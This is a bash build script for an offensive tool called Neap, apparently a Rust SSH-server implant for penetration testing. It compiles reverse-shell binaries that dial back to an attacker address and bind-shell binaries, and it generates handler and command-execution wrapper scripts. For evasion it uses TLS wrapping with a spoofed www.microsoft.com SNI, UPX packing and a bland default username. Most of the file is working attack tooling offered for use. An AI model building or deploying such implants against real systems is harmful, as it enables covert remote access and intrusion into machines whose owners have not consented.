#!/usr/bin/env bash
# build.sh — Build script for Neap
# Adapted from Undertow's build.sh for Rust/Cargo
set -euo pipefail

# ─── Catppuccin Mocha Palette ────────────────────────────────────────────────
RED='\033[38;2;243;139;168m'
GREEN='\033[38;2;166;227;161m'
YELLOW='\033[38;2;249;226;175m'
BLUE='\033[38;2;137;180;250m'
MAUVE='\033[38;2;203;166;247m'
TEAL='\033[38;2;148;226;213m'
PEACH='\033[38;2;250;179;135m'
TEXT='\033[38;2;205;214;244m'
SUBTEXT='\033[38;2;166;173;200m'
RESET='\033[0m'

# ─── Status Functions ────────────────────────────────────────────────────────
info()    { echo -e "${BLUE}[*]${RESET} ${TEXT}$*${RESET}"; }
success() { echo -e "${GREEN}[+]${RESET} ${TEXT}$*${RESET}"; }
warn()    { echo -e "${YELLOW}[!]${RESET} ${TEXT}$*${RESET}"; }
error()   { echo -e "${RED}[-]${RESET} ${TEXT}$*${RESET}"; }
die()     { error "$@"; exit 1; }

# ─── Defaults ────────────────────────────────────────────────────────────────
MODE=""
ADDRESS=""
HOST=""
PORT=""
PASSWORD=""
SHELL_PATH="/bin/bash"
TLS_WRAP=""
TLS_SNI="www.microsoft.com"
LUSER="svc"
PUBKEY=""
NOCLI=""
BPORT="0"
DRY_RUN=false
COMPRESS=false
OUTPUT_DIR="bin"
HANDLER_DIR="handlers"
TARGET=""

# ─── Usage ───────────────────────────────────────────────────────────────────
usage() {
    cat <<USAGE
${MAUVE}Neap Build Script${RESET}
${SUBTEXT}Rust rewrite of Undertow — statically-linked SSH server for penetration testing${RESET}

${TEAL}Usage:${RESET}
    ${TEXT}$0 reverse <ip:port> [options]${RESET}
    ${TEXT}$0 listen <port> [options]${RESET}

${TEAL}Modes:${RESET}
    ${GREEN}reverse${RESET}    Build a reverse-shell binary (dials home to attacker)
    ${GREEN}listen${RESET}     Build a bind-shell binary (listens for connections)

${TEAL}Options:${RESET}
    ${YELLOW}--password <pass>${RESET}    Set authentication password (default: random)
    ${YELLOW}--shell <path>${RESET}       Shell to spawn (default: /bin/bash)
    ${YELLOW}--tls${RESET}               Enable TLS wrapping
    ${YELLOW}--tls-sni <host>${RESET}    TLS SNI hostname (default: www.microsoft.com)
    ${YELLOW}--user <name>${RESET}       SSH username (default: svc)
    ${YELLOW}--pubkey <key>${RESET}      Authorized public key (base64)
    ${YELLOW}--nocli${RESET}             Disable CLI argument parsing in binary
    ${YELLOW}--bind-port <port>${RESET}  Additional bind port after reverse connect
    ${YELLOW}--target <triple>${RESET}   Cross-compile for specified target (e.g., x86_64-unknown-linux-musl)
    ${YELLOW}--compress${RESET}          Compress with UPX after building
    ${YELLOW}--dry-run${RESET}           Show configuration without building
    ${YELLOW}--help${RESET}              Show this help message

${TEAL}Examples:${RESET}
    ${SUBTEXT}$0 reverse 192.168.1.10:4444${RESET}
    ${SUBTEXT}$0 listen 8888 --password "s3cret" --tls${RESET}
    ${SUBTEXT}$0 reverse 10.10.14.5:443 --tls --compress${RESET}
USAGE
    exit 0
}

# ─── Parse Address ───────────────────────────────────────────────────────────
parse_address() {
    local addr="$1"

    # Handle IPv6 [addr]:port
    if [[ "$addr" =~ ^\[(.+)\]:([0-9]+)$ ]]; then
        HOST="${BASH_REMATCH[1]}"
        PORT="${BASH_REMATCH[2]}"
        return
    fi

    # Handle host:port
    if [[ "$addr" =~ ^(.+):([0-9]+)$ ]]; then
        HOST="${BASH_REMATCH[1]}"
        PORT="${BASH_REMATCH[2]}"
        return
    fi

    # Just a port number (for listen mode)
    if [[ "$addr" =~ ^[0-9]+$ ]]; then
        HOST=""
        PORT="$addr"
        return
    fi

    # Just a host (use default port)
    HOST="$addr"
    PORT="31337"
}

# ─── Validate Port ──────────────────────────────────────────────────────────
validate_port() {
    local port="$1"
    local name="${2:-port}"
    if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        die "Invalid $name: $port (must be 1-65535)"
    fi
}

# ─── Check Dependencies ─────────────────────────────────────────────────────
check_dependencies() {
    local missing=()

    if ! command -v cargo &>/dev/null; then
        missing+=("cargo (install from https://rustup.rs)")
    fi
    if ! command -v make &>/dev/null; then
        missing+=("make")
    fi
    if $COMPRESS && ! command -v upx &>/dev/null; then
        missing+=("upx (--compress requested)")
    fi

    if [ ${#missing[@]} -gt 0 ]; then
        error "Missing dependencies:"
        for dep in "${missing[@]}"; do
            echo -e "  ${RED}•${RESET} ${TEXT}$dep${RESET}"
        done
        die "Install missing dependencies and try again."
    fi
}

# ─── Generate Password ──────────────────────────────────────────────────────
generate_password() {
    local length="${1:-20}"
    if command -v openssl &>/dev/null; then
        openssl rand -base64 "$length" | tr -d '/+=' | head -c "$length"
    elif [ -f /dev/urandom ]; then
        tr -dc 'A-Za-z0-9!@#$%' < /dev/urandom | head -c "$length"
    else
        die "Cannot generate random password (no openssl or /dev/urandom)"
    fi
}

# ─── Sanitize for Filename ──────────────────────────────────────────────────
sanitize_for_filename() {
    echo "$1" | tr -c 'A-Za-z0-9._-' '_'
}

# ─── Build ───────────────────────────────────────────────────────────────────
build() {
    info "Building Neap..."
    echo ""

    # ── Engagement Checklist ──
    echo -e "${MAUVE}┌─────────────────────────────────────────┐${RESET}"
    echo -e "${MAUVE}│${RESET}  ${TEAL}Neap Build Configuration${RESET}               ${MAUVE}│${RESET}"
    echo -e "${MAUVE}├─────────────────────────────────────────┤${RESET}"
    echo -e "${MAUVE}│${RESET}  ${TEXT}Mode:${RESET}      ${GREEN}$MODE${RESET}"
    if [ "$MODE" = "reverse" ]; then
        echo -e "${MAUVE}│${RESET}  ${TEXT}Target:${RESET}    ${PEACH}$HOST:$PORT${RESET}"
    else
        echo -e "${MAUVE}│${RESET}  ${TEXT}Port:${RESET}      ${PEACH}$PORT${RESET}"
    fi
    echo -e "${MAUVE}│${RESET}  ${TEXT}Password:${RESET}  ${YELLOW}$PASSWORD${RESET}"
    echo -e "${MAUVE}│${RESET}  ${TEXT}Shell:${RESET}     ${TEXT}$SHELL_PATH${RESET}"
    echo -e "${MAUVE}│${RESET}  ${TEXT}User:${RESET}      ${TEXT}$LUSER${RESET}"
    if [ -n "$TLS_WRAP" ]; then
        echo -e "${MAUVE}│${RESET}  ${TEXT}TLS:${RESET}       ${GREEN}enabled${RESET} (SNI: ${TEAL}$TLS_SNI${RESET})"
    else
        echo -e "${MAUVE}│${RESET}  ${TEXT}TLS:${RESET}       ${SUBTEXT}disabled${RESET}"
    fi
    if [ -n "$PUBKEY" ]; then
        echo -e "${MAUVE}│${RESET}  ${TEXT}PubKey:${RESET}    ${SUBTEXT}configured${RESET}"
    fi
    if [ -n "$NOCLI" ]; then
        echo -e "${MAUVE}│${RESET}  ${TEXT}CLI:${RESET}       ${YELLOW}disabled${RESET}"
    fi
    if [ -n "$TARGET" ]; then
        echo -e "${MAUVE}│${RESET}  ${TEXT}Target:${RESET}    ${PEACH}$TARGET${RESET}"
    fi
    if $COMPRESS; then
        echo -e "${MAUVE}│${RESET}  ${TEXT}Compress:${RESET}  ${GREEN}UPX${RESET}"
    fi
    echo -e "${MAUVE}└─────────────────────────────────────────┘${RESET}"
    echo ""

    # ── Dry run stops here ──
    if $DRY_RUN; then
        info "Dry run — skipping build."
        return 0
    fi

    # ── Export environment variables for build.rs ──
    export NEAP_PASSWORD="$PASSWORD"
    export NEAP_SHELL="$SHELL_PATH"
    export NEAP_LUSER="$LUSER"
    export NEAP_LPORT="$PORT"
    export NEAP_BPORT="$BPORT"
    export NEAP_TLS_WRAP="$TLS_WRAP"
    export NEAP_TLS_SNI="$TLS_SNI"
    export NEAP_PUBKEY="$PUBKEY"
    export NEAP_NOCLI="$NOCLI"

    if [ "$MODE" = "reverse" ]; then
        export NEAP_LHOST="$HOST"
    else
        export NEAP_LHOST=""
    fi

    # ── Determine cargo features ──
    local cargo_features=""
    if [ -n "$NOCLI" ]; then
        cargo_features="--no-default-features"
    fi

    # ── Build ──
    local cargo_target_flag=""
    if [ -n "$TARGET" ]; then
        cargo_target_flag="--target $TARGET"
    fi
    info "Running cargo build --release $cargo_features $cargo_target_flag ..."
    cargo build --release $cargo_features $cargo_target_flag

    # ── Copy binary ──
    mkdir -p "$OUTPUT_DIR"
    local safe_name
    if [ "$MODE" = "reverse" ]; then
        safe_name="neap_$(sanitize_for_filename "${HOST}_${PORT}")"
    else
        safe_name="neap_listen_$(sanitize_for_filename "$PORT")"
    fi

    # Determine the release directory based on --target
    local release_dir="target/release"
    if [ -n "$TARGET" ]; then
        release_dir="target/$TARGET/release"
    fi

    # Try both Unix and Windows binary names
    if [ -f "$release_dir/neap" ]; then
        cp "$release_dir/neap" "$OUTPUT_DIR/$safe_name"
        success "Binary: $OUTPUT_DIR/$safe_name"
    elif [ -f "$release_dir/neap.exe" ]; then
        cp "$release_dir/neap.exe" "$OUTPUT_DIR/${safe_name}.exe"
        safe_name="${safe_name}.exe"
        success "Binary: $OUTPUT_DIR/$safe_name"
    else
        die "Build succeeded but binary not found in $release_dir/"
    fi

    # ── UPX Compression ──
    if $COMPRESS; then
        info "Compressing with UPX..."
        local compressed_name="upx_${safe_name}"
        if upx -o "$OUTPUT_DIR/$compressed_name" "$OUTPUT_DIR/$safe_name" 2>/dev/null; then
            local orig_size compressed_size
            orig_size=$(wc -c < "$OUTPUT_DIR/$safe_name")
            compressed_size=$(wc -c < "$OUTPUT_DIR/$compressed_name")
            success "Compressed: $OUTPUT_DIR/$compressed_name ($orig_size -> $compressed_size bytes)"
        else
            warn "UPX compression failed — uncompressed binary still available"
        fi
    fi

    # ── Generate Handler Script ──
    mkdir -p "$HANDLER_DIR"
    local handler_file
    if [ "$MODE" = "reverse" ]; then
        handler_file="$HANDLER_DIR/catch_${safe_name}.sh"
        cat > "$handler_file" <<HANDLER
#!/usr/bin/env bash
# Handler for Neap reverse shell — auto-generated
# Target will connect back to $HOST:$PORT
# Password: $PASSWORD

set -euo pipefail

echo "[*] Waiting for Neap reverse shell on port $PORT ..."
echo "[*] Password: $PASSWORD"
echo ""

# Start SSH server to catch the reverse connection
# The target runs Neap which dials home — you need an SSH client to connect.
# Use: ssh -p $PORT $LUSER@localhost
#   or if the target opens a bind port:
#   ssh -p $BPORT $LUSER@<target>

echo "[*] When the target connects, use:"
echo "    ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@127.0.0.1"
echo ""
echo "[*] Password: $PASSWORD"
HANDLER
        chmod +x "$handler_file"
        success "Handler: $handler_file"
    else
        handler_file="$HANDLER_DIR/connect_${safe_name}.sh"
        cat > "$handler_file" <<HANDLER
#!/usr/bin/env bash
# Handler for Neap bind shell — auto-generated
# Target listens on port $PORT
# Password: $PASSWORD

set -euo pipefail

TARGET="\${1:?Usage: \$0 <target-ip>}"

echo "[*] Connecting to Neap bind shell at \$TARGET:$PORT ..."
echo "[*] Password: $PASSWORD"
echo ""

ssh -o StrictHostKeyChecking=no -p $PORT $LUSER@"\$TARGET"
HANDLER
        chmod +x "$handler_file"
        success "Handler: $handler_file"
    fi

    # ── Generate nexec Wrapper ──
    local sanitized_host
    sanitized_host="$(sanitize_for_filename "$HOST")"
    local nexec_name="nexec-${sanitized_host}-${PORT}"
    local nexec_file="$OUTPUT_DIR/$nexec_name"
    local script_dir
    script_dir="$(cd "$(dirname "$0")" && pwd)"

    cat > "$nexec_file" <<NEXEC
#!/usr/bin/env bash
# nexec wrapper — auto-generated by build.sh
# Target: $LUSER@$HOST:$PORT
# Password: $PASSWORD
set -euo pipefail

COMMAND="\${1:?Usage: \$0 \"command\"}"
exec "$script_dir/scripts/nexec" "$LUSER@$HOST:$PORT" "\$COMMAND"
NEXEC
    chmod +x "$nexec_file"
    success "nexec wrapper: $nexec_file"

    echo ""
    success "Build complete!"
}

# ─── Main ────────────────────────────────────────────────────────────────────
main() {
    # No arguments — show help
    [ $# -eq 0 ] && usage

    # Parse mode
    case "${1:-}" in
        reverse|listen)
            MODE="$1"
            shift
            ;;
        --help|-h|help)
            usage
            ;;
        *)
            die "Unknown mode: $1 (use 'reverse' or 'listen')"
            ;;
    esac

    # Parse address (required)
    if [ $# -eq 0 ]; then
        die "Address/port required. Usage: $0 $MODE <address>"
    fi
    parse_address "$1"
    shift

    # Mode-specific validation
    if [ "$MODE" = "reverse" ]; then
        [ -z "$HOST" ] && die "Reverse mode requires host:port (e.g., 192.168.1.10:4444)"
        validate_port "$PORT"
    else
        validate_port "$PORT"
    fi

    # Parse remaining options
    while [ $# -gt 0 ]; do
        case "$1" in
            --password)
                shift
                PASSWORD="${1:?--password requires a value}"
                ;;
            --shell)
                shift
                SHELL_PATH="${1:?--shell requires a value}"
                ;;
            --tls)
                TLS_WRAP="1"
                ;;
            --tls-sni)
                shift
                TLS_SNI="${1:?--tls-sni requires a value}"
                TLS_WRAP="1"
                ;;
            --user)
                shift
                LUSER="${1:?--user requires a value}"
                ;;
            --pubkey)
                shift
                PUBKEY="${1:?--pubkey requires a value}"
                ;;
            --nocli)
                NOCLI="1"
                ;;
            --bind-port)
                shift
                BPORT="${1:?--bind-port requires a value}"
                validate_port "$BPORT" "bind-port"
                ;;
            --target)
                shift
                TARGET="${1:?--target requires a value}"
                ;;
            --compress)
                COMPRESS=true
                ;;
            --dry-run)
                DRY_RUN=true
                ;;
            --help|-h)
                usage
                ;;
            *)
                die "Unknown option: $1"
                ;;
        esac
        shift
    done

    # Generate password if not specified
    if [ -z "$PASSWORD" ]; then
        PASSWORD=$(generate_password 20)
        info "Generated password: ${YELLOW}$PASSWORD${RESET}"
    fi

    # Check dependencies (skip for dry run)
    if ! $DRY_RUN; then
        check_dependencies
    fi

    # Build
    build
}

main "$@"
